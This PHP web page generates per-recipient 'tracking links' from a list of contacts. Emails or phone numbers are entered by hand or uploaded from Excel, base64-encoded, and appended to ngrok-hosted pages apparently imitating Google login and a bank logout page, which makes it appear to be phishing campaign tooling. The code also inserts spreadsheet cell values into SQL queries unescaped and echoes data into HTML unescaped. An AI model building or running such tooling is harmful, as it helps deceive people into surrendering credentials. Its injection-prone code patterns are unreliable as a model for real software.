<?php
session_start();
$conn = new mysqli('localhost', 'root', '', 'group_db');
if ($conn->connect_error) die("Connection failed: " . $conn->connect_error);

require 'vendor/autoload.php';
use PhpOffice\PhpSpreadsheet\IOFactory;

function encryptData($data) {
    return urlencode(base64_encode($data));
}

// Handle Group Creation
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['group_name'])) {
    $group_name = $conn->real_escape_string($_POST['group_name']);
    
    // Insert group if it doesn't exist
    $conn->query("INSERT INTO groups (group_name) VALUES ('$group_name') ON DUPLICATE KEY UPDATE id=LAST_INSERT_ID(id)");
    $_SESSION['group_id'] = $conn->insert_id; // Store group ID
}

// Ensure group_id is set
$group_id = $_SESSION['group_id'] ?? null;
if (!$group_id) {
    echo "<script>alert('Please create a group first!');</script>";
}

// Handle Contact Addition
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['contact']) && $group_id) {
    $contact = $conn->real_escape_string($_POST['contact']);

    // Remove previous entry and insert new
    $conn->query("DELETE FROM contacts WHERE contact='$contact' AND group_id='$group_id'");
    $conn->query("INSERT INTO contacts (group_id, contact) VALUES ('$group_id', '$contact')");
}

// Handle Excel Upload
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file']) && $group_id) {
    $file = $_FILES['file']['tmp_name'];
    $spreadsheet = IOFactory::load($file);
    $worksheet = $spreadsheet->getActiveSheet();

    foreach ($worksheet->getRowIterator() as $row) {
        $cellValue = $row->getCellIterator()->current()->getValue();
        $conn->query("DELETE FROM contacts WHERE contact='$cellValue' AND group_id='$group_id'");
        $conn->query("INSERT INTO contacts (group_id, contact) VALUES ('$group_id', '$cellValue')");
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Group Management</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
</head>
<body class="bg-light">
    <div class="container mt-5">
        <h2 class="text-center text-primary mb-4">Group Management System</h2>

        <div class="card p-4 shadow">
            <h4>Create a Group</h4>
            <form method="post">
                <div class="input-group mb-3">
                    <input type="text" class="form-control" name="group_name" placeholder="Enter Group Name" required>
                    <button class="btn btn-primary" type="submit">Create</button>
                </div>
            </form>
        </div>

        <div class="card p-4 shadow mt-4">
            <h4>Add Contacts</h4>
            <form method="post">
                <div class="input-group mb-3">
                    <input type="text" class="form-control" name="contact" placeholder="Enter Email or Phone" required>
                    <button class="btn btn-success" type="submit">Add</button>
                </div>
            </form>

            <h5>Upload Excel File</h5>
            <form method="post" enctype="multipart/form-data">
                <div class="input-group">
                    <input type="file" class="form-control" name="file" required>
                    <button class="btn btn-warning" type="submit">Upload</button>
                </div>
            </form>
        </div>

        <div class="card p-4 shadow mt-4">
            <h4>Generated Tracking Links</h4>
            <ul class="list-group">
                <?php 
                if ($group_id) {
                    $contacts = $conn->query("SELECT contact FROM contacts WHERE group_id = '$group_id'");
                    $tracking_links = [
                        "https://2896-103-137-24-80.ngrok-free.app/google/googlei.php",
                        "https://2896-103-137-24-80.ngrok-free.app/google/googlei.php",
                        "https://your-ngrok-url.ngrok.io/eshop.php",
                        "https://your-ngrok-url.ngrok.io/askari_logout.php",
                        "https://your-ngrok-url.ngrok.io/google_login.php"
                    ];

                    while ($row = $contacts->fetch_assoc()) {
                        $encrypted_contact = encryptData($row['contact']);

                        foreach ($tracking_links as $link) {
                            $tracking_url = "$link?data=$encrypted_contact";
                            
                            echo "<li class='list-group-item'>
                                    <a href='$tracking_url' target='_blank'>$tracking_url</a>
                                  </li>";
                        }
                    }
                }
                ?>
            </ul>
        </div>
    </div>
</body>
</html>
